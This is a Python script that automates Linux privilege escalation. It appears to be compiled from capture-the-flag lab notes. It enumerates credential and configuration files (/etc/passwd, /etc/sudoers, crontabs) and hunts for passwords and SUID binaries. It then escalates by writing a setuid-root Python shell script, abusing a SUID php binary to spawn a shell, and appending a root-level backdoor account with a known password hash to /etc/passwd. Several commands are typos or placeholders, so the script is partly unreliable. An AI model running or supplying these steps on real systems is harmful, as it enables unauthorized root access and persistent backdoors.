#!/usr/bin/env python3

import os
import subprocess

# Define a function to execute commands and print output
def run_command(command):
    print(f"\nExecuting: {command}")
    result = subprocess.run(command, shell=True, text=True, capture_output=True)
    print(result.stdout)
    if result.stderr:
        print(f"Error: {result.stderr}")

# Basic Directory Navigation and File Checks
def basic_directory_navigation_and_file_checks():
    directories = [
        '/', '/var/tmp', '/tmp', '/dev/shm', '/var/mail',
        '/var/spool/mail', '/var/www', '/opt', '/etc', '/srv/ftp'
    ]
    
    for directory in directories:
        run_command(f'cd {directory} && ls -lah')
    
    run_command("cd /var/www/cgi-bin && ls -lah")
    run_command("cat /etc/passwd | grep -iE '/bin/sh|/bin/bash' --color=auto")
    run_command("cat /etc/stab")
    run_command("ls -lsa | grep -i '.secret'")
    run_command("ls -lsa /etc/passwd")
    run_command("cat /var/mail/jim")
    run_command("ls -lsaR")
    run_command("cat /etc/stab")

# System and Process Information
def system_and_process_information():
    run_command('ps aux | grep -i "root" --color=auto')
    run_command('ls -lsa /etc/cron*')
    run_command('cat /etc/crontab')
    run_command('cat /etc/crondaily.')
    run_command('file /bin/bash')
    run_command('netstat -antup')
    run_command('ss -tunlp')
    run_command('cat /etc/*-release')
    run_command('cat /etc/issue')
    run_command('netstat -antup | grep -i "127.0.0.1" --color=auto')
    run_command('dpkg -l | grep -i "mysql" --color=auto')
    run_command('cat /etc/sudoers')
    run_command('uname -a')

# Searching and Enumeration
def searching_and_enumeration():
    run_command('grep -Ri "password" --color=auto')
    run_command('cat /etc/fstab')
    run_command('mount')
    run_command('find / -perm -u=s -type f 2>/dev/null')
    run_command('find / -perm -g=s -type f 2>/dev/null')
    run_command('getcap -r / 2>/dev/null')
    run_command('file /bin/bash')

# Advanced Enumeration
def advanced_enumeration():
    run_command('which gcc')
    run_command('which perl')
    run_command('cd /var/www/html && cd /election && head index.php')
    run_command('cd /admin/inc && cat conn.php')
    run_command('ls -lsa /etc/cron-*')
    run_command('crontab -u root -l')
    run_command('use tool Pspy 32 or Pspy64')  # Replace with actual command if you have Pspy
    run_command('getcap -r / 2>/dev/null')  # Looking for cap_setuid+ep with Python2.7
    run_command('cd /var/tmp')
    
    # Creating and running a Python privilege escalation script
    with open('/var/tmp/offsec.py', 'w') as f:
        f.write('import os\n')
        f.write('os.setuid(0)\n')
        f.write('os.system("/bin/dash")\n')
    run_command('chmod +x /var/tmp/offsec.py')
    run_command('python2.7 /var/tmp/offsec.py')

# PHP Exploit
def php_exploit():
    run_command('ls -lsa /usr/bin/php')
    run_command('cd /usr/bin && ./php -r "pcntl_exec(\'/bin/sh\', [\'-p\']);"')

# User Addition and Privilege Escalation
def user_addition_and_privilege_escalation():
    run_command('ls -lah /etc/passwd')
    run_command('openssl passwd -1 i<3hacking')
    run_command("echo 'siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' >> /etc/passwd")
    run_command('su siren')
    run_command('id')

def main():
    print("Starting Linux Privilege Escalation Enumeration...\n")
    
    # Execute each function
    basic_directory_navigation_and_file_checks()
    system_and_process_information()
    searching_and_enumeration()
    advanced_enumeration()
    php_exploit()
    user_addition_and_privilege_escalation()

    print("Completed Linux Privilege Escalation Enumeration.\n")

if __name__ == '__main__':
    main()

